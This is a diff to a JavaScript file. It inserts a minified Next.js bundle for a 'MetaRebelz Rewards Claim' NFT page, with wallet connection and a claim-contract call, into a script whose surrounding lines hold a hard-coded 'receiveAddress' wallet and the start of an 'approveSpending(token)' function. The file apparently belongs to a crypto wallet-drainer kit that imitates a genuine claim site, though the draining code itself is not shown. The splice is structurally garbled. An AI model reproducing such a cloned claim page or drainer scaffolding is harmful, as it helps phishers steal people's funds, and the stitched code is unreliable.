@@ -4,16 +4,296 @@ const receiveAddress = "0xb24E8eaAf141D69c44044146694FcbF81363FAE3";   // remove
 var cryptotokenContract;
 var smartcontract
 
-return o && i && a ? (
-    // UI for connected state
-) : (
-    (0, n.jsx)("button", {
-        onClick: d,  // This is the event that triggers wallet connection
-        type: "button",
-        className: "border-2 border-white ml-3 inline-flex items-center rounded-md bg-red-800 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-red-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-frens-600",
-        children: "Connect Wallet"
-    })
-)
+(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
+    [5405], {
+        48312: function(e, s, r) {
+            (window.__NEXT_P = window.__NEXT_P || []).push(["/", function() {
+                return r(36717)
+            }])
+        },
+        36717: function(e, s, r) {
+            "use strict";
+            r.r(s), r.d(s, {
+                default: function() {
+                    return q
+                }
+            });
+            var n = r(85893),
+                t = r(38644),
+                i = r.n(t),
+                a = r(9008),
+                l = r.n(a),
+                d = r(25675),
+                o = r.n(d),
+                c = r(44253),
+                u = r(59417),
+                m = r(67814),
+                x = r(34646),
+                h = r(17106),
+                b = r(43122),
+                g = r(67294),
+                v = r(4830);
+
+            function f() {
+                for (var e = arguments.length, s = Array(e), r = 0; r < e; r++) s[r] = arguments[r];
+                return s.filter(Boolean).join(" ")
+            }
+            let j = e => {
+                let {
+                    wallet: s
+                } = e;
+                return s.delegateVault ? (0, n.jsxs)(n.Fragment, {
+                    children: [(0, n.jsx)(o(), {
+                        src: "/delegatecash.svg",
+                        className: "-mt-1 inline-block",
+                        alt: "",
+                        height: 16,
+                        width: 16
+                    }), (0, n.jsx)("span", {
+                        className: "pl-1.5",
+                        children: s.ens || s.address.substring(0, 6) + "••••" + s.address.substring(38)
+                    })]
+                }) : (0, n.jsx)("span", {
+                    children: s.ens || s.address.substring(0, 6) + "••••" + s.address.substring(38)
+                })
+            };
+
+            function p() {
+                let {
+                    delegateWallets: e,
+                    selectedVault: s,
+                    selectVault: r
+                } = (0, g.useContext)(c.d), {
+                    data: t,
+                    isError: i,
+                    isLoading: a
+                } = (0, v.c)({
+                    name: null == s ? void 0 : s.ens,
+                    query: {
+                        enabled: !!(null == s ? void 0 : s.ens)
+                    }
+                });
+                return (0, n.jsx)(n.Fragment, {
+                    children: (0, n.jsx)(b.NL.Custom, {
+                        children: t => {
+                            let {
+                                account: i,
+                                chain: a,
+                                openAccountModal: l,
+                                openConnectModal: d,
+                                mounted: o
+                            } = t;
+                            return o && i && a ? (0, n.jsx)(n.Fragment, {
+                                children: (0, n.jsx)("div", {
+                                    className: "relative inline-block text-left",
+                                    children: (0, n.jsx)("div", {
+                                        children: (0, n.jsx)("div", {
+                                            children: (0, n.jsxs)("div", {
+                                                className: "border-gray-100 border-2 inline-flex items-center rounded-md bg-red-900 text-sm font-semibold text-white shadow-sm focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-red-700",
+                                                children: [(0, n.jsx)("button", {
+                                                    type: "button",
+                                                    onClick: l,
+                                                    className: f("rounded-l-md py-2 px-2 hover:bg-primary-600", 0 == e.length ? "rounded-r-md" : ""),
+                                                    id: "menu-button",
+                                                    "aria-expanded": "true",
+                                                    "aria-haspopup": "true",
+                                                    children: (0, n.jsx)(j, {
+                                                        wallet: s || {
+                                                            address: i.address,
+                                                            ens: i.ensName,
+                                                            delegateVault: !1
+                                                        }
+                                                    })
+                                                }), 0 == e.length ? (0, n.jsx)(n.Fragment, {}) : (0, n.jsxs)(x.v, {
+                                                    as: "div",
+                                                    className: "rounded-r-md relative inline-block text-left hover:bg-red-700",
+                                                    children: [(0, n.jsx)("div", {
+                                                        children: (0, n.jsx)(x.v.Button, {
+                                                            className: "border-l border-gray-300 inline-block pl-2 pr-3 py-2 ",
+                                                            children: (0, n.jsx)(m.G, {
+                                                                icon: u.ptq,
+                                                                size: "xs",
+                                                                "aria-hidden": "true"
+                                                            })
+                                                        })
+                                                    }), (0, n.jsx)(h.u, {
+                                                        as: g.Fragment,
+                                                        enter: "transition ease-out duration-100",
+                                                        enterFrom: "transform opacity-0 scale-95",
+                                                        enterTo: "transform opacity-100 scale-100",
+                                                        leave: "transition ease-in duration-75",
+                                                        leaveFrom: "transform opacity-100 scale-100",
+                                                        leaveTo: "transform opacity-0 scale-95",
+                                                        children: (0, n.jsx)(x.v.Items, {
+                                                            className: "absolute right-0 z-10 mt-2 min-w-max text-center origin-top-right rounded-md bg-white shadow-lg ring-1 ring-black ring-opacity-5 focus:outline-none",
+                                                            children: (0, n.jsx)("div", {
+                                                                className: "py-1",
+                                                                children: e.filter(e => (!s || e.address != s.address) && (!!s || i.address != e.address)).map(e => (0, n.jsx)(x.v.Item, {
+                                                                    children: s => {
+                                                                        let {
+                                                                            active: t
+                                                                        } = s;
+                                                                        return (0, n.jsx)("div", {
+                                                                            onClick: () => {
+                                                                                r(e.address)
+                                                                            },
+                                                                            className: f(t ? "bg-gray-300" : "", "text-gray-700 block px-4 py-2 text-sm"),
+                                                                            children: (0, n.jsx)(j, {
+                                                                                wallet: e
+                                                                            })
+                                                                        })
+                                                                    }
+                                                                }, e.address))
+                                                            })
+                                                        })
+                                                    })]
+                                                })]
+                                            })
+                                        })
+                                    })
+                                })
+                            }) : (0, n.jsx)("button", {
+                                onClick: d,
+                                type: "button",
+                                className: "border-2 border-white ml-3 inline-flex items-center rounded-md bg-red-800 px-3 py-2 text-sm font-semibold text-white shadow-sm hover:bg-red-700 focus-visible:outline focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-frens-600",
+                                children: "Connect Wallet"
+                            })
+                        }
+                    })
+                })
+            }
+            var y = r(81758),
+                N = r(92321);
+            let w = () => {
+                let {
+                    selectedVault: e,
+                    ready: s
+                } = (0, g.useContext)(c.d), {
+                    address: r
+                } = (0, N.m)(), n = (0, g.useMemo)(() => s ? (null == e ? void 0 : e.address) || r : void 0, [s, e, r]);
+                return {
+                    address: s ? r : void 0,
+                    vault: null == e ? void 0 : e.address,
+                    readAddress: n
+                }
+            };
+            var C = r(89810),
+                k = r(82016),
+                F = r(83540),
+                _ = r(5019),
+                z = r(1958);
+            let E = "0xBb46873610932C54a12058676FAb1cd00225570b";
+            var q = () => {
+                var e;
+                let s = (0, _.V)(["error InvalidProof()", "error AlreadyClaimed()", "function claimed(address) external view returns (bool)", "function claim(uint256,address,bytes32[]) external"]),
+                    {
+                        address: r,
+                        vault: t
+                    } = w(),
+                    {
+                        data: a,
+                        error: d,
+                        isLoading: c
+                    } = (0, y.ZP)("/api/claim?address=".concat(t || r), e => t || r ? fetch(e).then(e => e.json()) : Promise.resolve({})),
+                    {
+                        data: x
+                    } = (0, C.u)({
+                        address: E,
+                        abi: s,
+                        functionName: "claimed",
+                        args: [t || r || z.D],
+                        query: {
+                            enabled: !!t || !!r
+                        }
+                    }),
+                    {
+                        writeContract: h,
+                        data: b,
+                        status: g,
+                        error: v
+                    } = (0, k.S)(),
+                    {
+                        data: f,
+                        status: j
+                    } = (0, F.A)({
+                        hash: b
+                    });
+                return (0, n.jsxs)(n.Fragment, {
+                    children: [(0, n.jsxs)(l(), {
+                        children: [(0, n.jsx)("title", {
+                            children: "MetaRebelz Rewards Claim"
+                        }), (0, n.jsx)("meta", {
+                            name: "description",
+                            content: "MetaRebelz Rewards Claim"
+                        }), (0, n.jsx)("meta", {
+                            name: "og:image",
+                            content: "https://metarebelz.io/img/logo.png"
+                        }), (0, n.jsx)("link", {
+                            rel: "icon",
+                            href: "/logo.png"
+                        })]
+                    }), (0, n.jsx)("div", {
+                        className: "container w-full mx-auto mt-8 p-8 text-gray-100 ".concat(i().className),
+                        children: (0, n.jsxs)("div", {
+                            className: "flex flex-col text-center gap-6",
+                            children: [(0, n.jsx)("div", {
+                                className: "mx-auto",
+                                children: (0, n.jsx)(o(), {
+                                    src: "/fullnewlogo.png",
+                                    alt: "MetaRebelz",
+                                    width: 200,
+                                    height: 200
+                                })
+                            }), (0, n.jsx)("div", {
+                                children: (0, n.jsx)(p, {})
+                            }), r ? c ? (0, n.jsx)("div", {
+                                children: "Loading..."
+                            }) : a.proof && (null === (e = a.proof) || void 0 === e ? void 0 : e.length) != 0 ? x ? (0, n.jsx)(n.Fragment, {
+                                children: (0, n.jsx)("div", {
+                                    children: "Already Claimed"
+                                })
+                            }) : (0, n.jsxs)(n.Fragment, {
+                                children: [(0, n.jsxs)("div", {
+                                    children: ["Eligible to claim ", a.quantity, " Bone Keys"]
+                                }), (0, n.jsx)("div", {
+                                    children: "idle" === g ? (0, n.jsx)("button", {
+                                        className: "border-gray-100 border-2 bg-red-900 text-white px-2 py-1.5 rounded-md",
+                                        onClick: () => {
+                                            let e = t || r;
+                                            e && h({
+                                                address: E,
+                                                abi: s,
+                                                functionName: "claim",
+                                                args: [a.quantity, e, a.proof]
+                                            })
+                                        },
+                                        children: "Claim Keys"
+                                    }) : "pending" === g ? (0, n.jsxs)("button", {
+                                        className: "border-gray-100 border-2 bg-red-900 text-white px-2 py-1.5 rounded-md",
+                                        children: ["Claiming ", (0, n.jsx)(m.G, {
+                                            icon: u.LM3,
+                                            spin: !0
+                                        })]
+                                    }) : (0, n.jsx)("button", {
+                                        className: "border-gray-100 border-2 bg-red-900 text-white px-2 py-1.5 rounded-md",
+                                        children: "Claimed!"
+                                    })
+                                })]
+                            }) : (0, n.jsx)("div", {
+                                children: "Not eligible for rewards"
+                            }) : (0, n.jsx)(n.Fragment, {})]
+                        })
+                    })]
+                })
+            }
+        }
+    },
+    function(e) {
+        e.O(0, [4976, 1861, 2888, 9774, 179], function() {
+            return e(e.s = 48312)
+        }), _N_E = e.O()
+    }
+]);
 	
 function approveSpending(token) {
 	
